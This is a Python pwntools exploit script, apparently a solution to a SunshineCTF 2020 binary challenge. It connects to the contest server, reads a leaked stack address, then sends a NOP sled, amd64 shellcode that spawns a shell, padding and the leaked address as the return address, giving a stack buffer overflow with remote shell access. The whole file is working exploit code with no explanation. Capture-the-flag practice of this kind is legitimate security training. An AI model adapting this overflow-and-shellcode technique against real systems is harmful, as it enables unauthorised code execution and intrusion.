#!/usr/bin/python3
from pwn import *

context.arch = "amd64"

isim = "./chall"

#p = process(isim)
p = remote("chal.2020.sunshinectf.org",30003)

p.readline()
p.sendline("")
leak = int(p.readline().split(b": ")[1].rstrip(),16)

print (f"Leak : {hex(leak)}")

sh = shellcraft.amd64.linux.sh()

payload = b"\x90"*10 + asm(sh)
payload += b"A" * (120 - len(payload))
payload += p64(leak)

p.sendline(payload)

p.interactive()
